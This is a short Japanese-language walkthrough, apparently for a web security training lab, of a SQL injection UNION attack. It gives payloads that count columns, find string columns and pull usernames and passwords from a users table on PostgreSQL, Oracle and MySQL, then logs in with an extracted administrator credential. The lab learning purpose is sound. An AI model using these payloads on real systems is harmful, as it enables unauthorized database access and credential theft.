

# 🔥 SQL Injection UNION Attack 手順（完全版）

---

## **🎯 ステップ1: カラム数の確認**

### ORDER BY で調べる方法
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
- エラーが出たら **その前の数字がカラム数**

---

### UNION SELECT で調べる方法
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
- **エラーが出ない行がカラム数**

---

## **🎯 ステップ2: 文字列型カラムの確認**

2カラムの場合：

```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

- `'a'` を入れて **エラーが出ない方が文字列型カラム**

---

## **🎯 ステップ3: データ取得（ユーザー名＋パスワード）**

### 1カラム目が文字列型だった場合：

---

### **PostgreSQL / Oracle**
```sql
' UNION SELECT username||':'||password, NULL FROM users--
```

---

### **MySQL**
```sql
' UNION SELECT CONCAT(username,':',password), NULL FROM users--
```

---

## **🎯 HTML に出る結果の例**

```html
<tr>
    <th>administrator:sni3sfljf88almh4ufwu</th>
</tr>
```

---

## **🎯 取得できたクレデンシャル**

- **Username:** administrator  
- **Password:** sni3sfljf88almh4ufwu  

---

## **🎯 次のステップ**

1. 画面右上の **"My account"** をクリック  
2. ログインフォームに入力：

```
Username: administrator
Password: sni3sfljf88almh4ufwu
```

3. **ログイン成功 → ラボ Solved！**

